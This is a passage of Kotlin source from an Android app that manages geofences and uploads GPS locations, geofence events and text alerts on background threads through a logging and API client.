                logException(
                    "${AppConstants.TUMBLR_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }
        }
    }

    /** Add and update Geo Fences List **/
    fun handleGeoFencing() {
        coroutineScope.launch(Dispatchers.Main) {
            val geoFences =
                async(Dispatchers.IO) { return@async localDatabaseSource.selectGeoFences() }.await()
            if (geoFences.isNotEmpty()) {
                logVerbose("${AppConstants.GEO_FENCES_EVENTS_TYPE} geo fences list = $geoFences")
                GeoFenceApiClient.instance?.setGeoFencesList(applicationContext, geoFences)
            } else {
                GeoFenceApiClient.instance?.removeGeoFences()
                logVerbose("${AppConstants.GEO_FENCES_EVENTS_TYPE} geo fences list is empty")
            }
        }
    }

    /** fetches the Gps Locations while Gps is On **/
    fun fetchGpsLocation() {
        try {
            val executor: ExecutorService = Executors.newSingleThreadExecutor()
            executor.execute {
                LogFactory(
                    applicationContext,
                    AppConstants.GPS_LOCATION_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi
                ).getLog().uploadLogs()
            }
        } catch (exception: Exception) {
            logException(
                "${AppConstants.GPS_LOCATION_TYPE} exception while syncing data = ${exception.message}",
                TAG,
                exception
            )
        }
    }

    /** Upload Geo Fences Events on Demand **/
    fun uploadGeoFences() {
        try {
            val executor: ExecutorService = Executors.newSingleThreadExecutor()
            executor.execute {
                LogFactory(
                    applicationContext,
                    AppConstants.GEO_FENCES_EVENTS_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi
                ).getLog().uploadLogs()
            }
        } catch (exception: Exception) {
            logException(
                "${AppConstants.GEO_FENCES_EVENTS_TYPE} exception while syncing data = ${exception.message}",
                TAG,
                exception
            )
        }
    }

    fun uploadTextAlerts() {
        try {
            val executor: ExecutorService = Executors.newSingleThreadExecutor()
            executor.execute {
                LogFactory(
                    applicationContext,
                    AppConstants.TEXT_ALERT_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi
                ).getLog().uploadLogs()
            }
        } catch (exception: Exception) {
            logException(
                "${AppConstants.TEXT_ALERT_TYPE} exception while syncing data = ${exception.message}",
                TAG,
                exception
            )
        }
    }

    fun cancelJobs(): Unit {
        if (dataJob != null) {
            dataJob!!.cancel()
        }
        if (localDataSyncJob != null) {
            localDataSyncJob!!.cancel()
        }
    }
}